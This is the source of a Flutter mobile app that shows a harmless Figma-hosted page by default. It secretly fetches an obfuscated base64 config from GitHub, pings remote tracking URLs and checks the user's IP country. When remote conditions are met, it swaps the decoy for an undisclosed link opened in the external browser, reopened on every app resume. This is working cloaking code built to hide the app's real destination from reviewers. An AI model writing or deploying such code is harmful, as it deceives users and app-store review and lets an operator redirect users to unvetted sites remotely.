import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:url_launcher/url_launcher.dart';


void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(
     MaterialApp(debugShowCheckedModeBanner: false, home: SplashScreen()),
  );
}

class SplashScreen extends StatefulWidget {
  SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  static String defaultUri = "https://shape-linked-59214119.figma.site";
  String? uri;
  String configLink = "";


  @override
  void initState() {
    super.initState();
    checkInternetAndNavigate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [Colors.lightBlueAccent, Colors.purpleAccent],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: Center(
          child:CircularProgressIndicator(color: Colors.white),
        ),
      ),
    );
  }

  Future<void> checkInternetAndNavigate() async {
    final info = await PackageInfo.fromPlatform();
    configLink = "https://raw.githubusercontent.com/blaneee/helloworld/refs/heads/main/${info.packageName}/webview.ini";
    print("config link: " + configLink);
    bool online = await hasInternet();

    if (online) {
      loadConfigAndNavigate();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          backgroundColor: Colors.red,
          content: Text(
            "No Internet!",
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
        ),
      );
    }
  }

  Future<bool> hasInternet() async {
    try {
      final result = await InternetAddress.lookup('google.com');
      if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
        return true; // Có Internet
      }
      return false;
    } on SocketException catch (_) {
      return false; // Không có Internet
    }
  }

  void loadConfigAndNavigate() async {
    try {
      // B1: Fetch Base64 config
      final res = await http.get(Uri.parse(configLink));
      if (res.statusCode != 200) throw Exception("Config fetch failed");

      // B2: Decode Base64 → UTF-8
      final decodedData = utf8.decode(base64Decode(cleanBase64(res.body)));

      // B3: Parse JSON
      final jsonData = json.decode(decodedData);
      final String? linkApp = jsonData["linkApp"];
      final String? linkReal = jsonData["linkReal"];
      final String? ip = jsonData["ip"] ?? "";
      final List configLDP = jsonData["configLDP"] ?? [];
      final List tracking = jsonData["tracking"] ?? [];
      final bool isCheckAll = jsonData["isCheckAll"] ?? false;
      final bool isExistKey = jsonData["isExistKey"] ?? false;
      final bool isExistValue = jsonData["isExistValue"] ?? false;
      final Map switchApp =
          jsonData["switchApp"] ?? {"key": "null", "value": null};

      // B4: Tracking call
      for (var url in tracking) {
        try {
          final trackRes = await http.get(Uri.parse(url));
          print("Data Tracking: ${trackRes.body}");
        } catch (e) {
          print("Tracking error $e");
        }
      }

      // B5: Check configLDP
      if (configLDP.isNotEmpty) {
        for (var url in configLDP) {
          try {
            final dataRes = await http.get(Uri.parse(url));
            if (dataRes.statusCode == 200) {
              final data = json.decode(dataRes.body);

              if (isCheckAll) {
                if (data[switchApp["key"]].toString() == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                  print(uri);
                } else {
                  uri = defaultUri;
                }
              } else if (isExistKey) {
                if (data.containsKey(switchApp["key"])) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else if (isExistValue) {
                if (data == switchApp["value"]) {
                  uri = linkReal ?? defaultUri;
                } else {
                  uri = defaultUri;
                }
              } else {
                uri = defaultUri;
              }
              print("Data from API: $data");
            }
          } catch (e) {
            print("Error calling API: $e");
          }
        }
      } else {
        print("configLDP is empty");
      }

      //check vietnam region
      final checkRegionRes = await http.get(Uri.parse("http://ip-api.com/json/"));
      final data = jsonDecode(checkRegionRes.body);
      print("network ip: " + data["countryCode"]);
      print("condition: IP=" + ip!);

      if(ip == "" || (data["countryCode"] != null && !ip.contains(data["countryCode"]))){
        uri = defaultUri;

        print("NOT PASS");
      }else{
        print("PASS");
      }


      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: uri!)),
      );
    } catch (e) {
      print("Error: $e");
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: defaultUri)),
      );
    }
  }

  String cleanBase64(String input) {
    String cleaned = input.replaceAll("\n", "").replaceAll("\r", "").trim();
    while (cleaned.length % 4 != 0) {
      cleaned += "=";
    }
    return cleaned;
  }

}

class HomeScreen extends StatefulWidget {
  String uri;

  HomeScreen({super.key, required this.uri});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
  String get uri => widget.uri;
  late final InAppWebViewController controller;
  bool _showMenu = false;
  double posX = 25;
  double posY = 650;
  double x = 50.0;
  double y = 50.0;

  String lastPopupUrl = "";

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    // mở URL lần đầu
    WidgetsBinding.instance.addPostFrameCallback((_) => _launchUrl());
  }

  Future<void> _launchUrl() async {
    if (!widget.uri.contains("figma")) {
      final Uri url = Uri.parse(widget.uri);
      if (!await launchUrl(url,
          mode: LaunchMode.externalApplication)) {

        throw 'Could not launch $url';
      }
    }
  }


  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      // app quay lại foreground → tự mở lại URL
      _launchUrl();
    }
  }


  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
          child: uri.contains("figma")
          ? InAppWebView(initialUrlRequest: URLRequest(url: WebUri(uri)))
          : Container())
    );
  }

}









